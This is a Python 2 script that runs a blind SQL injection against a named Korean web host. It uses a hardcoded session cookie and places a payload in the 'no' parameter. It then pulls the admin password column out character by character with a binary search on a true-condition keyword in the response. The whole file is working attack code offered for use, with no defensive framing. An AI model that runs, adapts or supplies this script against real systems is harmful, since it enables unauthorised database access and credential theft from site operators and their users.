#!/usr/bin/python
# -*- coding: cp949 -*-
import sys
import getopt,urllib2
from urllib import *
import string

base = "https://seed.kisa.or.kr"
TrueKeyword = "onlyTrueKeyword"  

def CheckInject(tNum,num,t):     ## Checking Condition(T or F) ?
	cookie='JSESSIONID=5D4F81514BB4D8E9DDC1C4C0E916D431'
	injectParam = "2 and char(%s)>substr(pw,%s,1)-- " % (num,t) 
	param={'no':injectParam,'id':'admin','pw':'1234'}
	headers = {'Cookie':cookie}
	f = urllib2.Request(base + '?' + urlencode(param),headers=headers)
	response = urllib2.urlopen(f)
	text = response.read()
	if text.find(TrueKeyword) != -1:
		return True
	else:
		return False

def binarySearch(tNum,start,end,str):   ## Binary Searching algorithm
	mid = ( start + end ) / 2
	Result = CheckInject(tNum,mid,str)
	if ( end - start ) <= 1:
		if Result==False:
			return start
		else:
			return end
	if Result == False:
		print "        %2d" % mid ," > str - True"
		return binarySearch(tNum,mid,end,str)
	else:
		print "        %2d" % mid ," > str - False"
		return binarySearch(tNum,start,mid,str)

def SearchTabName(tNum):    ## Searching TableName
	TabName = ""
	tNum += 1
	print "[*] %dth Searching Database..." % tNum
	tNum -= 1
	for Count in range(1,255):
		print "    [*] Searching %s Str" % Count 
		FindStr = binarySearch(tNum,0,128,"%s" % str(Count))
		TabName = TabName + chr(FindStr).lower()
		if FindStr == 127:
			return TabName
		elif FindStr == 32:
			print "		[-] End of String !"
			break;
		elif FindStr != 40:
			print "      [+] Find Str : %s" % chr(FindStr).lower()
		else:
			print "		[-] Failure!"
	return TabName

TableList=[]
tReturn=True
for x in range(0,255):
	tmpTab=SearchTabName(x)
	
	print "\n================================"
	print "[+] Database Name  : %s " % tmpTab
	print "================================"

	break;
	print tmpTab
	if tmpTab == False:
		print '    [-] End of Table!'
		TableList.append(tmpTab)
		break
	TableList.append(tmpTab)

tCount=len(TableList)
if tCount > 0:
	print "\n================================"
	print "[+] %s Database Found !!" % tCount
	print "================================"
	for x in TableList:
		print x
	print "================================\n"
else:
	print "[-] Tables Searching Failure !!"

